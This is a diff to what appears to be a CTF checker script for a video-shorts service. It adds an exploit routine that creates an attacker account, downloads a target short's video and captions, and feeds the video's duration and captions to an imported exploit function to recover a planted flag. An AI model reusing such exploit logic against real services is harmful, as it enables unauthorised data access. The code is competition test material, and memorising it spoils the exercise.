@@ -9,7 +9,9 @@ from names import adjectives, content_types, cities, countries, german_proverbs
 import ffmpeg
 from bs4 import BeautifulSoup
 import subprocess
+import tempfile
 from pathlib import Path
+from exploit_translation import full_exploit_for_shorts
 
 from typing import Optional
 from logging import LoggerAdapter
@@ -218,12 +220,26 @@ def get_duration(filename):
     )
     return float(result.stdout)
 
+def get_duration_from_bytes(video_bytes):
+    with tempfile.NamedTemporaryFile(suffix=".mp4") as tmp:
+        tmp.write(video_bytes)
+        tmp.flush()  # Ensure it's written before probing
+
+        result = subprocess.run(
+            ["ffprobe", "-v", "error", "-show_entries",
+             "format=duration", "-of", "default=noprint_wrappers=1:nokey=1", tmp.name],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT
+        )
+        return float(result.stdout)
+
 async def upload_short(client: AsyncClient, logger, short_title, description, subtitles, translate_to_spanish):
     """Upload a short video with the given title, description, subtitles and translation option."""
     logger.info(f"Uploading short video with title: {short_title}, description: {description}, subtitles: {subtitles}, translate_to_spanish: {translate_to_spanish}")
     
     with open(get_random_video_path(), "rb") as video_file:
         duration = get_duration(video_file.name)
+        duration = round(duration, 2)  # Round to 2 decimal places Like in Client javascript
         logger.info(f"Video duration: {duration} seconds, {video_file.name}")
         files = {
             "name": (None, short_title),
@@ -336,6 +352,8 @@ async def putflag_short(
 
     await db.set("userdata2", (username, password, short_title))
     logger.info(f"User data saved for {username}, and uploaded successfully")
+    
+    return short_title
 
 @checker.getflag(1)
 async def getflag_short(
@@ -528,6 +546,68 @@ async def exploit_video(task: ExploitCheckerTaskMessage, searcher: FlagSearcher,
         return flag
     raise MumbleException("flag not found")
 
+
+
+@checker.exploit(1)
+async def exploit_short(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
+    username_attacker: str = "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    password_attacker: str = "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=12)
+    )
+    
+    await signup(client, username_attacker, password_attacker, logger)
+    await login(client, username_attacker, password_attacker, logger)
+    
+    logger.info(f"Exploiting {task.attack_info} variant {task.variant_id} task {task}")
+    short_title = task.attack_info
+    response = await client.get(f"/get_shorts")
+    if response.status_code != 200:
+        raise MumbleException()
+    
+    try:
+        shorts = response.json()
+    except ValueError:
+        logger.error("Failed to parse JSON response from /get_shorts")
+        raise MumbleException("Failed to parse JSON response from /get_shorts")
+
+    short_to_exploit = get_short_to_exploit(shorts, short_title, logger)
+    video_bytes = await get_video_bytes_from_short(short_to_exploit, client, logger)
+    duration = get_duration_from_bytes(video_bytes)
+    duration_two_decimal = round(duration, 2)
+    logger.info(f"Duration of the video title {short_title} is {duration_two_decimal} seconds")
+    caption_path = short_to_exploit.get("caption_path")
+    captions = await client.get(caption_path)
+    captions = captions.text
+    logger.info(f"Captions for the short {short_title} are {captions}")
+    
+    flag = full_exploit_for_shorts(duration_two_decimal, captions)
+    logger.info(f"Flag for short {short_title} is {flag}")
+    
+    if flag := searcher.search_flag(flag):
+        logger.info(f"Flag found: {flag}")
+        return flag
+    else:
+        logger.error("Flag not found in the exploited short")
+        raise MumbleException("Flag not found in the exploited short")
+
+async def get_video_bytes_from_short(short, client: AsyncClient, logger: LoggerAdapter) -> bytes:
+    video_path = short.get("path")
+    video = await client.get(video_path)
+    if video.status_code != 200:
+        logger.error(f"Failed to get video bytes from {video_path}, status code: {video.status_code}")
+        raise MumbleException(f"Failed to get video bytes from {video_path}")
+    
+    logger.info(f"Successfully retrieved video bytes from {video_path}")
+    return video.content
+
+def get_short_to_exploit(shorts, short_title, logger):
+    for short in shorts:
+        if short.get("name") == short_title:
+            logger.info(f"Found short with title {short_title}")
+            return short
+    raise MumbleException(f"Short with title {short_title} not found in response")
 
 
 if __name__ == "__main__":
